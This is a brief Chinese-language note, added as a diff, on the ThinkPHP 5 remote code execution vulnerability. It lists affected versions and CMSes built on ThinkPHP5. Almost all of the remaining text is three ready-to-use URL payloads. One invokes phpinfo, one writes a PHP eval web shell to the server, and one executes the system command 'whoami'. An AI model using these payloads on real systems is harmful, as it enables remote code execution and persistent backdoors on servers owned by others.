@@ -1,0 +1,7 @@
+影响范围：
+	5.x < 5.1.31--5.x < 5.0.23
+	以及基于ThinkPHP5 二次开发的cms，如AdminLTE后台管理系统、thinkcmf、ThinkSNS等
+payload：
+	public/index.php/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+	public/index.php/?s=index/\think\template\driver\file/write&cacheFile=zxc0.php&content=<?php @eval($_POST[xxxxxx]);?>’
+	public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
